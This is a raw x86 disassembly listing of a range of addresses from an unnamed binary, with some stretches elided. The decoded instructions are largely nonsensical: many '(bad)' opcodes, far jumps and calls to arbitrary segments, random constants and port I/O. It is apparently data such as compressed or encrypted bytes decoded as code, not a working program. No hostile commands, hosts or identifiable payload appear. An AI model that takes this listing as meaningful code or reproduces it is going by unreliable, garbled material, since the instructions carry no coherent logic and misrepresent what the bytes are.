  418859:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41885a:	add    BYTE PTR ss:[edi],0xc7
  41885e:	inc    ecx
  41885f:	fisttp QWORD PTR ss:[ebp+0x5b506fb5]
  418866:	mov    edi,DWORD PTR [ebx+0x42]
  418869:	cld    
  41886a:	or     bh,bh
  41886c:	sub    esp,DWORD PTR [edi+0x0]
	...
  4188d3:	add    BYTE PTR [eax],al
  4188d5:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  4188dc:	hlt    
  4188dd:	fbld   TBYTE PTR [esi-0x4163c533]
  4188e3:	lods   eax,DWORD PTR gs:[esi]
  4188e5:	cmp    eax,0x10867
  4188ea:	add    BYTE PTR [ecx],al
  4188ec:	add    BYTE PTR [eax],al
  4188ee:	xor    al,cl
  4188f0:	push   ds
  4188f1:	xor    esi,eax
  4188f3:	pop    edi
  4188f4:	mov    ecx,0x85e5d3ef
  4188f9:	jb     0x4188ed
  4188fb:	pop    ecx
  4188fc:	into   
  4188fd:	xchg   BYTE PTR [eax],cl
  4188ff:	daa    
  418900:	inc    ecx
  418901:	jne    0x4188c5
  418903:	(bad)  
  418904:	lods   eax,DWORD PTR ds:[esi]
  418905:	stos   DWORD PTR es:[edi],eax
  418906:	xor    al,0x58
  418908:	mov    esi,0x4c943ccc
  41890d:	and    ebp,DWORD PTR [edx+0x4e83df5c]
  418913:	clc    
  418914:	les    esp,FWORD PTR [ebx]
  418916:	fmul   QWORD PTR [ebx+eax*8]
  418919:	adc    dl,cl
  41891b:	mov    eax,eax
  41891d:	xor    dh,BYTE PTR [edi]
  41891f:	add    eax,0x70fb5456
  418924:	bound  ebx,QWORD PTR [si+0x37]
  418928:	fbstp  TBYTE PTR [ebp-0x38e1eeb]
  41892e:	sub    DWORD PTR [eax],eax
  418930:	cmp    BYTE PTR [ebx+0x38],0x55
  418934:	lods   al,BYTE PTR ds:[esi]
  418935:	mov    eax,0x28f995ff
  41893a:	outs   dx,BYTE PTR ds:[esi]
  41893b:	dec    ecx
  41893c:	cmp    al,0x2a
  41893e:	outs   dx,DWORD PTR ds:[esi]
  41893f:	jo     0x4189bb
  418941:	lods   eax,DWORD PTR ds:[esi]
  418942:	outs   dx,BYTE PTR ds:[esi]
  418943:	stos   DWORD PTR es:[edi],eax
  418944:	sub    al,0x28
  418946:	(bad)  
  418947:	loope  0x418995
  418949:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41894a:	ret    
  41894b:	xacquire xchg DWORD PTR [ebp+eiz*2-0x78],edi
  418950:	xor    eax,0x49f40a74
  418955:	sbb    eax,0x47b137b0
  41895a:	and    edx,DWORD PTR [esi-0xf]
  41895d:	scas   al,BYTE PTR es:[edi]
  41895e:	mov    esp,ebp
  418960:	adc    eax,0xfee52ba9
  418965:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418966:	push   ss
  418967:	test   eax,0xe5b5c363
  41896c:	scas   al,BYTE PTR es:[edi]
  41896d:	xchg   edi,eax
  41896e:	jmp    0xfa11eb18
  418973:	pop    ds
  418974:	stc    
  418975:	xchg   ebp,eax
  418976:	dec    esp
  418977:	and    BYTE PTR [ecx-0x6b83fa67],bl
  41897d:	jl     0x4189e0
  41897f:	imul   BYTE PTR [ecx]
  418981:	daa    
  418982:	cwde   
  418983:	sbb    esi,edx
  418985:	test   ecx,ebx
  418987:	pop    ecx
  418988:	push   ss
  418989:	mov    cs,edx
  41898b:	adc    dl,dh
  41898d:	jge    0x4189c2
  41898f:	inc    edx
  418990:	inc    ecx
  418991:	mov    cl,0x15
  418993:	jge    0x418997
  418995:	and    eax,0xcfc48940
  41899a:	es pop ds
  41899c:	loope  0x4189a7
  41899e:	mov    al,ds:0x3d5bfbe3
  4189a3:	jmp    0xccb0:0xf76bfbad
  4189aa:	jnp    0x418965
  4189ac:	sub    eax,0x484188ef
  4189b1:	pop    esi
  4189b2:	imul   ebx,DWORD PTR [eax-0x1c71552],0xffffffb3
  4189b9:	dec    ebx
  4189ba:	dec    esi
  4189bb:	das    
  4189bc:	lods   al,BYTE PTR ds:[esi]
  4189bd:	cmp    BYTE PTR [edx+0x36],0x10
  4189c1:	out    dx,al
  4189c2:	mov    WORD PTR [ecx-0x42f4265],fs
  4189c8:	push   esp
  4189c9:	pop    ebp
  4189ca:	sub    BYTE PTR [ecx],ah
  4189cc:	mov    DWORD PTR ds:0x692fd246,ebx
  4189d2:	out    dx,al
  4189d3:	mov    dl,0xaf
  4189d5:	mov    eax,0x84953594
  4189da:	in     eax,dx
  4189db:	cdq    
  4189dc:	pop    es
  4189dd:	fst    st(7)
  4189df:	pop    eax
  4189e0:	mov    bl,0x84
  4189e2:	outs   dx,BYTE PTR ds:[esi]
  4189e3:	data16 mov dl,BYTE PTR [edx+0x22]
  4189e7:	out    dx,al
  4189e8:	fcomp  st(7)
  4189ea:	mov    edi,0x455260
	...
  418a53:	add    BYTE PTR [eax],al
  418a55:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  418a5c:	into   
  418a5d:	fwait
  418a5e:	add    bh,cl
  418a60:	mov    ebp,0x8d84dc69
  418a65:	addr16 or DWORD PTR [bx+di],eax
  418a69:	add    BYTE PTR [eax],al
  418a6b:	add    DWORD PTR [eax],eax
  418a6d:	add    BYTE PTR [edi],al
  418a6f:	aad    0xf3
  418a71:	int    0x97
  418a73:	xchg   esi,eax
  418a74:	mov    ebx,DWORD PTR [esi+0x7dcf5c71]
  418a7a:	pusha  
  418a7b:	retf   
  418a7c:	adc    BYTE PTR [ecx-0x48],bl
  418a7f:	sub    BYTE PTR [ebx+0x5b55811e],cl
  418a85:	xor    eax,0xd0f1bd53
  418a8a:	fninit 
  418a8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a8d:	(bad)  
  418a8f:	xor    BYTE PTR [edi-0x487f9aed],dl
  418a95:	rcl    DWORD PTR [ecx-0x2c],1
  418a98:	mov    ebp,0x49c1ade8
  418a9d:	xchg   BYTE PTR [eax],al
  418a9f:	mov    BYTE PTR [ecx-0x6bb52497],dh
  418aa5:	nop
  418aa6:	pop    edx
  418aa7:	mov    ecx,0xba7364ef
  418aac:	scas   eax,DWORD PTR es:[edi]
  418aad:	(bad)  
  418aae:	mov    edi,0x786f9b4d
  418ab3:	push   DWORD PTR [eax]
  418ab5:	jg     0x418b2e
  418ab7:	scas   eax,DWORD PTR es:[edi]
  418ab8:	lods   eax,DWORD PTR ds:[esi]
  418ab9:	mov    ch,0x3
  418abb:	jl     0x418acc
  418abd:	pushw  0x56c2
  418ac1:	cmp    DWORD PTR [edi+0x64cd9cd3],edx
  418ac7:	dec    esp
  418ac8:	gs dec edx
  418aca:	(bad)  
  418acb:	test   DWORD PTR [ebx+0x22],0x6e53731
  418ad2:	adc    ecx,DWORD PTR [esi]
  418ad4:	xor    eax,0xc41cd1ca
  418ad9:	cmp    eax,0xdd0ab0e5
  418ade:	cmc    
  418adf:	dec    edx
  418ae0:	gs pop edi
  418ae2:	pop    ebp
  418ae3:	cdq    
  418ae4:	shl    ch,cl
  418ae6:	or     BYTE PTR [ebx-0xa067fe7],al
  418aec:	icebp  
  418aed:	or     bh,ch
  418aef:	leave  
  418af0:	jnp    0x418afd
  418af2:	cmp    dl,cl
  418af4:	daa    
  418af5:	test   DWORD PTR [eax-0x6cf21c3],esp
  418afb:	test   BYTE PTR [ecx+0x38],dh
  418afe:	mov    edx,0xc9252aa8
  418b03:	pop    edi
  418b04:	sub    eax,ebx
  418b06:	inc    ebx
  418b07:	jg     0x418aef
  418b09:	sbb    dl,bh
  418b0b:	cmp    al,0xb3
  418b0d:	add    al,0xe4
  418b0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b10:	ins    DWORD PTR es:[edi],dx
  418b11:	loopne 0x418b35
  418b13:	(bad)  
  418b14:	sub    eax,0x3cc81b39
  418b19:	xor    eax,0xaa3388d2
  418b1e:	shl    DWORD PTR [eax-0x3d],0xa4
  418b22:	jle    0x418b33
  418b24:	sub    eax,0xca7d5bf7
  418b29:	inc    eax
  418b2a:	xchg   ebp,eax
  418b2b:	add    eax,ecx
  418b2d:	xor    al,dl
  418b2f:	mov    eax,0x711c88d1
  418b34:	stos   DWORD PTR es:[edi],eax
  418b35:	ret    0xfceb
  418b38:	mov    dl,BYTE PTR [eax+0x77eb2cae]
  418b3e:	das    
  418b3f:	mov    ebp,0xda4ce89
  418b44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b45:	adc    esi,DWORD PTR [esi+0x18f0b68a]
  418b4b:	mov    ebx,0x39eaa1fa
  418b50:	mov    al,ds:0x9cf07a3d
  418b55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b56:	xor    eax,ecx
  418b58:	das    
  418b59:	dec    ecx
  418b5a:	daa    
  418b5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b5c:	int3   
  418b5d:	retf   0xb8e8
  418b60:	xchg   ch,dl
  418b62:	retf   0xef90
  418b65:	rcr    DWORD PTR [eax+0x3c],cl
  418b68:	sahf   
  418b69:	xchg   ebx,eax
  418b6a:	dec    edx
  418b6b:	nop
  418b6c:	stc    
  418b6d:	inc    esi
	...
  418bd6:	jl     0x418beb
  418bd8:	test   DWORD PTR [edx],esi
  418bda:	out    dx,eax
  418bdb:	mov    dh,0xff
  418bdd:	pop    edi
  418bde:	sar    BYTE PTR [ebp+0x3b],1
  418be1:	in     eax,0x2c
  418be3:	or     cl,dl
  418be5:	loopne 0x418c4e
  418be7:	or     al,BYTE PTR [ecx]
  418be9:	add    BYTE PTR [eax],al
  418beb:	add    DWORD PTR [eax],eax
  418bed:	add    bh,ch
  418bef:	(bad)  
  418bf0:	mov    ch,0x7c
  418bf2:	test   eax,0xef145d36
  418bf7:	repnz and al,0x3c
  418bfa:	popf   
  418bfb:	xchg   ebp,eax
  418bfc:	nop
  418bfd:	push   0xfffffffe
  418bff:	loopne 0x418c57
  418c01:	div    BYTE PTR [edx-0x59d0c539]
  418c07:	je     0x418b96
  418c09:	std    
  418c0a:	mov    al,0x77
  418c0c:	dec    ebp
  418c0d:	arpl   WORD PTR [ebp+0x6c],dx
  418c10:	mov    eax,0x58a9b5be
  418c15:	test   DWORD PTR [ebp+ecx*8-0x57],edi
  418c19:	dec    ecx
  418c1a:	add    edx,DWORD PTR [edx]
  418c1c:	(bad)  
  418c1d:	popf   
  418c1e:	call   0x3883:0x73fa32e
  418c25:	add    eax,0x82e0da02
  418c2a:	inc    esi
  418c2b:	sub    al,0xe9
  418c2d:	xor    edi,DWORD PTR [edx]
  418c2f:	lds    edi,FWORD PTR [eax+eiz*4-0x31]
  418c33:	mov    edx,0x69a286b5
  418c38:	pop    ds
  418c39:	jae    0x418bf1
  418c3b:	add    edi,DWORD PTR [ebx+0x51]
  418c3e:	jmp    0x9fe9:0x84226d2d
  418c45:	jbe    0x418c34
  418c47:	sbb    al,dl
  418c49:	rcl    DWORD PTR [edx],cl
  418c4b:	(bad)  
  418c4d:	in     al,0x1d
  418c4f:	push   esp
  418c50:	out    0x9d,eax
  418c52:	xchg   esp,eax
  418c53:	mov    dl,0xc6
  418c55:	xor    al,0xd
  418c57:	aas    
  418c58:	add    eax,0xb7e92c6c
  418c5d:	xchg   ebx,eax
  418c5e:	in     eax,dx
  418c5f:	xchg   edx,esi
  418c61:	cwde   
  418c62:	dec    ecx
  418c63:	mov    ebp,0xe0bf0327
  418c68:	sti    
  418c69:	sahf   
  418c6a:	loope  0x418c79
  418c6c:	xlat   BYTE PTR ds:[ebx]
  418c6d:	in     al,0x76
  418c6f:	lods   eax,DWORD PTR ds:[esi]
  418c70:	mov    esp,0xe2a55bb5
  418c75:	sldt   edi
  418c78:	ja     0x418cef
  418c7a:	jmp    0x418cd7
  418c7c:	scas   eax,DWORD PTR es:[edi]
  418c7d:	add    eax,0x6971d364
  418c82:	pop    esp
  418c83:	inc    ecx
  418c84:	and    eax,0xe253e751
  418c89:	sbb    al,0x96
  418c8b:	outs   dx,BYTE PTR ds:[esi]
  418c8c:	sar    DWORD PTR [edx+0x4b],0x88
  418c90:	inc    edx
  418c91:	repnz fcom QWORD PTR [ecx+0x439b0c58]
  418c98:	div    esi
  418c9a:	mov    cl,0x22
  418c9c:	das    
  418c9d:	bound  ecx,QWORD PTR [esi]
  418c9f:	push   ecx
  418ca0:	in     al,0x8f
  418ca2:	push   cs
  418ca3:	idiv   esi
  418ca5:	idiv   BYTE PTR [eax-0x25c8f575]
  418cab:	fwait
  418cac:	popf   
  418cad:	jmp    FWORD PTR [eax+0x51]
  418cb0:	sbb    BYTE PTR [ecx-0x99e080e],ah
  418cb6:	inc    edx
  418cb7:	jno    0x418caf
  418cb9:	in     al,0xb
  418cbb:	cmp    eax,0xef26c348
  418cc0:	(bad)  [edi]
  418cc2:	daa    
  418cc3:	bound  esi,QWORD PTR [esi-0x71]
  418cc6:	loop   0x418d34
  418cc8:	jnp    0x418d2b
  418cca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ccb:	imul   DWORD PTR [ecx+ebp*2]
  418cce:	mov    esp,0xffde00a4
  418cd3:	mov    dl,0x42
  418cd5:	cs sbb al,0xb0
  418cd8:	lods   eax,DWORD PTR ds:[esi]
  418cd9:	int    0x71
  418cdb:	(bad)  
  418cdc:	jecxz  0x418ce9
  418cde:	dec    esp
  418cdf:	jno    0x418ca0
  418ce1:	and    cl,BYTE PTR [eax]
  418ce3:	sub    BYTE PTR [edx],ah
  418ce5:	lods   eax,DWORD PTR ds:[esi]
  418ce6:	jo     0x418caf
  418ce8:	jg     0x418d22
  418cea:	xor    DWORD PTR [eax+0x86c],esp
	...
  418d54:	add    BYTE PTR [eax],al
  418d56:	sti    
  418d57:	inc    edx
  418d58:	out    dx,al
  418d59:	aas    
  418d5a:	(bad)  
  418d5b:	mov    edi,0x6a1ac6fb
  418d60:	(bad)  
  418d61:	shl    BYTE PTR [ebx],cl
  418d63:	shl    bh,0xec
  418d66:	or     eax,DWORD PTR [bx+di]
  418d69:	add    BYTE PTR [eax],al
  418d6b:	add    DWORD PTR [eax],eax
  418d6d:	add    BYTE PTR [edx+0x75],al
  418d70:	shl    BYTE PTR [edx-0x4bba517f],cl
  418d76:	sub    dl,BYTE PTR ds:0x11e88600
  418d7c:	rcl    DWORD PTR [edi+esi*2],cl
  418d7f:	cmp    DWORD PTR [eax],esp
  418d81:	popa   
  418d82:	dec    edi
  418d83:	stos   DWORD PTR es:[edi],eax
  418d84:	pop    ss
  418d85:	push   edx
  418d86:	xchg   edx,eax
  418d87:	and    DWORD PTR [edi+0x67f75722],esp
  418d8d:	or     DWORD PTR [esi-0x44],esi
  418d90:	pop    es
  418d91:	idiv   DWORD PTR [edi+0x1fd4bf8b]
  418d97:	push   cs
  418d98:	int3   
  418d99:	stos   DWORD PTR es:[edi],eax
  418d9a:	xor    DWORD PTR [ecx-0x67],0xffffffa0
  418d9e:	fadd   st(5),st
  418da0:	cmp    DWORD PTR [ecx],eax
  418da2:	jb     0x418dc5
  418da4:	push   ss
  418da5:	mov    esi,0xcb03f44a
  418daa:	mov    ds:0x3ac3ace4,eax
  418daf:	add    dh,BYTE PTR [edx-0x54]
  418db2:	jbe    0x418dce
  418db4:	mov    dh,0x5f
  418db6:	xlat   BYTE PTR ds:[ebx]
  418db7:	sti    
  418db8:	loope  0x418db1
  418dba:	mov    ds:0x214096f0,eax
  418dbf:	inc    ebx
  418dc0:	jbe    0x418e06
  418dc2:	push   eax
  418dc3:	repz addr16 ds sti 
  418dc7:	jbe    0x418e35
  418dc9:	add    edx,esi
  418dcb:	call   0x67d41679
  418dd0:	mov    al,0x89
  418dd2:	pop    ecx
  418dd3:	test   eax,0x9df52a61
  418dd8:	push   cs
  418dd9:	sub    DWORD PTR [ebx+esi*4+0x5a3f8cb4],edx
  418de0:	xchg   edx,eax
  418de1:	push   ebx
  418de2:	lods   eax,DWORD PTR ds:[esi]
  418de3:	xor    eax,0xfc861ff8
  418de8:	pop    ds
  418de9:	pop    esp
  418dea:	push   esp
  418deb:	int    0xd4
  418ded:	rcl    BYTE PTR [edi+0x5b],cl
  418df0:	int3   
  418df1:	loope  0x418d78
  418df3:	arpl   WORD PTR [eax+eax*8],bx
  418df6:	mov    dl,0x4b
  418df8:	mov    eax,0x1e167cf9
  418dfd:	adc    edi,DWORD PTR [ebp+0x69]
  418e00:	xchg   esi,eax
  418e01:	xor    al,0x18
  418e03:	mov    ecx,0x9fea74fe
  418e08:	inc    esi
  418e09:	dec    esp
  418e0a:	pop    es
  418e0b:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  418e0d:	xchg   esi,eax
  418e0e:	xor    edx,DWORD PTR [edi]
  418e10:	lods   al,BYTE PTR ds:[esi]
  418e11:	jno    0x418e0b
  418e13:	dec    ebx
  418e14:	push   0x88476357
  418e19:	pushf  
  418e1a:	or     ebx,DWORD PTR [edi+0x3]
  418e1d:	add    bl,ah
  418e1f:	imul   eax,DWORD PTR [ebx+ebp*1],0x24dc29d8
  418e26:	adc    al,ch
  418e28:	shr    BYTE PTR [eax-0x1aaeb5f1],cl
  418e2e:	mov    edi,0xaf856d9e
  418e33:	cli    
  418e34:	mov    eax,ds:0x2ddd31d1
  418e39:	add    ecx,DWORD PTR [ecx+0x7ed91067]
  418e3f:	jno    0x418e1f
  418e41:	xchg   esi,eax
  418e42:	sub    eax,0x1b4f9064
  418e47:	in     eax,0xe5
  418e49:	push   0x56d309af
  418e4e:	enter  0x4eaf,0x2c
  418e52:	addr16 dec edx
  418e54:	and    al,ah
  418e56:	pushf  
  418e57:	leave  
  418e58:	jb     0x418e7d
  418e5a:	cmp    BYTE PTR [edi],bl
  418e5c:	mov    BYTE PTR [ebp+0x53],dl
  418e5f:	adc    al,0x20
  418e61:	jg     0x418e49
  418e63:	xchg   ebp,eax
  418e64:	sub    BYTE PTR [edx+eiz*2+0x198d7108],0xc3
  418e6c:	test   eax,0xc6
	...
  418ed5:	add    BYTE PTR [esi],cl
  418ed7:	bnd call 0xde7c8b0d
  418edd:	dec    dl
  418edf:	leave  
  418ee0:	and    ah,BYTE PTR [edx+0x2e]
  418ee3:	pop    esi
  418ee4:	push   ds
  418ee5:	push   eax
  418ee6:	addr16 or al,0x1
  418ee9:	add    BYTE PTR [eax],al
  418eeb:	add    DWORD PTR [eax],eax
  418eed:	add    BYTE PTR [esi],ch
  418eef:	fldenv [edx+ebx*8-0x17731950]
  418ef6:	inc    DWORD PTR [eax]
  418ef8:	mov    eax,ds:0x8e058344
  418efd:	arpl   WORD PTR [eax],sp
  418eff:	fist   DWORD PTR [ebx-0x1c4f1504]
  418f05:	test   DWORD PTR [esi-0x3d67020f],ebp
  418f0b:	imul   esp,DWORD PTR [ecx-0x41],0x993a6b2f
  418f12:	push   ecx
  418f13:	add    eax,0x5ec0cf19
  418f18:	cmp    ah,BYTE PTR [esi+0x79]
  418f1b:	fs out dx,al
  418f1d:	fstp   QWORD PTR [esi+0x5f]
  418f20:	xor    BYTE PTR [esi+0x7],dl
  418f23:	jo     0x418f02
  418f25:	jnp    0x418ed8
  418f27:	mov    ch,0x95
  418f29:	dec    ecx
  418f2a:	in     eax,dx
  418f2b:	scas   al,BYTE PTR es:[edi]
  418f2c:	stc    
  418f2d:	jg     0x418f5b
  418f2f:	cmp    BYTE PTR [edx-0x5c00608b],0x3c
  418f36:	cmp    eax,0x13181e76
  418f3b:	lods   al,BYTE PTR ds:[esi]
  418f3c:	xor    eax,0xcb43f5ee
  418f41:	stos   BYTE PTR es:[edi],al
  418f42:	(bad)  
  418f43:	cmp    al,0xf3
  418f45:	loop   0x418ee5
  418f47:	fldenv [eax+ebp*1+0x21]
  418f4b:	shl    DWORD PTR ds:0xd407fba9,0x5a
  418f52:	in     eax,0x6a
  418f54:	mov    bh,0xb5
  418f56:	fldenv [eax-0x69f66e07]
  418f5c:	popf   
  418f5d:	jle    0x418f79
  418f5f:	test   al,0xf8
  418f61:	imul   edi,DWORD PTR [edi+edi*1],0xd8c415ee
  418f68:	fnsave [edx+ebx*8-0x57]
  418f6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f6d:	sahf   
  418f6e:	adc    BYTE PTR [ecx*4+0x47c58d67],al
  418f75:	mov    edx,0x3b161b52
  418f7a:	popf   
  418f7b:	mov    al,0x92
  418f7d:	aam    0x51
  418f7f:	imul   ebp
  418f81:	mov    eax,ds:0x60f59a52
  418f86:	punpckhbw mm3,QWORD PTR [edx]
  418f89:	sub    DWORD PTR [ecx],0xffffff8f
  418f8c:	js     0x418f9c
  418f8e:	mov    al,dl
  418f90:	sub    BYTE PTR [edi],ah
  418f92:	xchg   edi,eax
  418f93:	aas    
  418f94:	loopne 0x418f9f
  418f96:	mov    eax,0xe1a321db
  418f9b:	(bad)  
  418f9c:	aam    0x1c
  418f9e:	js     0x419016
  418fa0:	adc    ch,bh
  418fa2:	xchg   ebp,eax
  418fa3:	xor    esi,DWORD PTR [edi]
  418fa5:	xchg   ecx,eax
  418fa6:	xchg   DWORD PTR [edx],ebx
  418fa8:	xchg   ecx,eax
  418fa9:	inc    edx
  418faa:	cmp    DWORD PTR [edi+0x7e],ecx
  418fad:	jmp    0xea5ce411
  418fb2:	outs   dx,BYTE PTR ds:[esi]
  418fb3:	lds    eax,FWORD PTR [ecx]
  418fb5:	dec    ecx
  418fb6:	sbb    bh,cl
  418fb8:	add    eax,0xf1e54821
  418fbd:	sbb    DWORD PTR [ebp+eax*8-0x33],ebp
  418fc1:	or     edi,DWORD PTR [ecx+0x73]
  418fc4:	push   0x944c13d3
  418fc9:	call   0xc6b8:0x995e0b35
  418fd0:	xor    dl,BYTE PTR ds:0x20bf8b91
  418fd6:	mov    edx,0x69a154fa
  418fdb:	xchg   edi,eax
  418fdc:	(bad)  
  418fdd:	int    0xf3
  418fdf:	popf   
  418fe0:	jp     0x418fbc
  418fe2:	outs   dx,BYTE PTR ds:[esi]
  418fe3:	or     al,BYTE PTR [ecx-0x21]
  418fe6:	add    eax,ebp
  418fe8:	test   BYTE PTR [eax+0x22],0x16
  418fec:	mov    eax,0x42
	...
  419055:	add    BYTE PTR [edi+edx*4],bl
  419058:	in     al,0x47
  41905a:	out    dx,eax
  41905b:	ja     0x41901c
  41905d:	fild   WORD PTR [ecx+0x6ceaf1a7]
  419063:	mov    bl,0x8f
  419065:	in     al,dx
  419066:	addr16 or eax,0x1000001
  41906c:	add    BYTE PTR [eax],al
  41906e:	mov    ebp,0xea8c2c9
  419073:	fdivr  QWORD PTR [edx-0x1679e4fa]
  419079:	xchg   edi,eax
  41907a:	push   edx
  41907b:	sub    edx,0xe5e42322
  419081:	cs mov ebp,0xd1dc35ef
  419087:	mov    ds:0xe9adf4e1,al
  41908c:	inc    ebp
  41908d:	fmul   DWORD PTR [ecx+0x44]
  419090:	mov    dh,0x77
  419092:	and    eax,esp
  419094:	outs   dx,BYTE PTR ds:[esi]
  419095:	pop    ds
  419096:	or     BYTE PTR [ebp+0x2322a752],0x41
  41909d:	sbb    DWORD PTR [eax+0x3713e052],edi
  4190a3:	xchg   esp,eax
  4190a4:	dec    edx
  4190a5:	lock retf 
  4190a7:	call   0x146e3895
  4190ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190ad:	sbb    eax,0x814a5874
  4190b2:	add    DWORD PTR [eax],edx
  4190b4:	shl    edx,0x56
  4190b7:	cmp    al,ah
  4190b9:	stos   BYTE PTR es:[edi],al
  4190ba:	cwde   
  4190bb:	ret    
  4190bc:	hlt    
  4190bd:	jmp    0xcdc3bb65
  4190c2:	ja     0x41911c
  4190c4:	xchg   ebx,eax
  4190c5:	pop    es
  4190c6:	ficom  DWORD PTR [bp+di]
  4190c9:	aas    
  4190ca:	cmp    esi,DWORD PTR [ecx-0x69]
  4190cd:	xor    cl,BYTE PTR [ecx+ebp*2]
  4190d0:	inc    esp
  4190d1:	fcmovnb st,st(2)
  4190d3:	(bad)  
  4190d4:	shl    DWORD PTR [esi-0x67],1
  4190d7:	push   ebp
  4190d8:	aad    0x74
  4190da:	xchg   edi,eax
  4190db:	add    eax,0x5dfaa52e
  4190e0:	idiv   ah
  4190e2:	sahf   
  4190e3:	ret    0xea8d
  4190e6:	xor    eax,0xea25dcca
  4190eb:	lock repz dec edi
  4190ee:	popf   
  4190ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190f0:	call   0xed7b59d
  4190f5:	mov    esp,0xd8ad176e
  4190fa:	add    BYTE PTR [edx],ah
  4190fc:	jmp    0x4190a9
  4190fe:	xlat   BYTE PTR ds:[ebx]
  4190ff:	loopne 0x41910c
  419101:	mov    DWORD PTR [ebx-0x35d17f7e],esi
  419107:	push   esi
  419108:	xchg   ebx,eax
  419109:	mov    ds:0xa153b4ae,eax
  41910e:	xchg   edi,eax
  41910f:	(bad)  
  419110:	sbb    al,0x5
  419112:	mov    al,0xa0
  419114:	sar    esp,cl
  419116:	(bad)  
  419117:	mov    bl,0x33
  419119:	in     eax,dx
  41911a:	mov    dh,0x55
  41911c:	mov    ecx,0x6a03506e
  419121:	fidivr DWORD PTR [ecx]
  419123:	inc    eax
  419124:	mov    es,eax
  419126:	(bad)  
  419127:	mov    al,0x80
  419129:	push   esi
  41912a:	gs push ss
  41912c:	adc    eax,0xf6f68ea4
  419131:	mov    BYTE PTR [esi-0xe],dl
  419134:	dec    ebx
  419135:	jp     0x419177
  419137:	add    bl,al
  419139:	xor    eax,0x4d20c96a
  41913e:	or     DWORD PTR [ecx+0x4f7489c7],esp
  419144:	jge    0x4191ba
  419146:	mov    esp,0x813f1f9
  41914b:	push   0xfffffffc
  41914d:	outs   dx,DWORD PTR ds:[esi]
  41914e:	call   0x9655:0x42d64448
  419155:	lds    eax,FWORD PTR [ebp+0x5c]
  419158:	jns    0x41912c
  41915a:	pop    ebx
  41915b:	dec    esp
  41915c:	jmp    0x41911c
  41915e:	(bad)  
  41915f:	pop    eax
  419160:	jg     0x41918e
  419162:	test   al,0xf
  419164:	jne    0x4191c0
  419166:	ins    DWORD PTR es:[edi],dx
  419167:	xor    eax,0x32f7d891
  41916c:	outs   dx,DWORD PTR ds:[esi]
  41916d:	bound  eax,QWORD PTR [eax]
	...
  4191d3:	add    BYTE PTR [eax],al
  4191d5:	add    BYTE PTR [edi-0x41bd617b],ch
  4191db:	pop    ebx
  4191dc:	(bad)  
  4191dd:	in     eax,dx
  4191de:	inc    esi
  4191df:	push   0x4d
  4191e1:	or     bl,BYTE PTR [ebx+esi*4+0xe67d088]
  4191e8:	add    DWORD PTR [eax],eax
  4191ea:	add    BYTE PTR [ecx],al
  4191ec:	add    BYTE PTR [eax],al
  4191ee:	cwde   
  4191ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191f0:	inc    ebx
  4191f1:	mov    ecx,0xc7be33c
  4191f6:	icebp  
  4191f7:	mov    ds:0x545d6d3d,al
  4191fc:	cld    
  4191fd:	fwait
  4191fe:	mov    ah,BYTE PTR [edx+0x2e]
  419201:	or     DWORD PTR [edi+0x65],esi
  419204:	in     al,dx
  419205:	mov    al,ds:0x58a7206e
  41920a:	mov    edx,0xeffafeb9
  41920f:	mov    esp,DWORD PTR [edi]
  419211:	xchg   esi,eax
  419212:	xchg   edi,eax
  419213:	imul   eax,DWORD PTR [ebx],0xffffff83
  419216:	jne    0x419218
  419218:	pop    eax
  419219:	sub    BYTE PTR [edi-0x3cf04bfa],dh
  41921f:	sbb    al,0x9b
  419221:	mov    eax,0x18a535d7
  419226:	jns    0x419294
  419228:	out    0xe9,al
  41922a:	and    ebp,DWORD PTR [ebx]
  41922c:	inc    eax
  41922d:	push   0x52c5c436
  419232:	scas   al,BYTE PTR es:[edi]
  419233:	pop    esi
  419234:	fild   QWORD PTR [esi]
  419236:	pusha  
  419237:	into   
  419238:	mov    esi,0xcedf48d1
  41923d:	xchg   ecx,eax
  41923e:	into   
  41923f:	cdq    
  419240:	mov    al,0xcc
  419242:	jp     0x419279
  419244:	loopne 0x419281
  419246:	xchg   ebx,eax
  419247:	fistp  QWORD PTR [ebx+0x7a]
  41924a:	jmp    0xb9984a2f
  41924f:	pop    ecx
  419250:	push   eax
  419251:	inc    eax
  419252:	cmp    ah,bh
  419254:	adc    BYTE PTR [edx+0x7a],ch
  419257:	add    bl,bl
  419259:	mov    WORD PTR [edx],es
  41925b:	daa    
  41925c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41925d:	pop    es
  41925e:	sub    esp,ebx
  419260:	mov    ecx,0x39ea386e
  419265:	dec    eax
  419266:	push   ebp
  419267:	ja     0x419231
  419269:	out    dx,al
  41926a:	jge    0x41920d
  41926c:	xchg   DWORD PTR [eax],ecx
  41926e:	aaa    
  41926f:	mov    al,ds:0xcd2bbe02
  419274:	pop    esi
  419275:	xchg   edx,eax
  419276:	xchg   edi,eax
  419277:	(bad)  
  419278:	sbb    al,0x6c
  41927a:	and    al,0xf8
  41927c:	fdiv   QWORD PTR [ecx-0x68]
  41927f:	inc    ecx
  419280:	pop    es
  419281:	mov    ebx,edi
  419283:	dec    esi
  419284:	add    eax,0x8256f46c
  419289:	lods   al,BYTE PTR ds:[esi]
  41928a:	pop    ebp
  41928b:	mov    bl,0xa7
  41928d:	int3   
  41928e:	aas    
  41928f:	(bad)  
  419291:	fsub   st(4),st
  419293:	cmp    esp,DWORD PTR [edi+0xdb89015]
  419299:	xchg   ebx,eax
  41929a:	clc    
  41929b:	mov    cl,0xd
  41929d:	push   cs
  41929e:	xchg   esi,ebx
  4192a0:	mov    ch,0x2f
  4192a2:	sbb    bl,BYTE PTR [esi+eiz*8-0x34f551df]
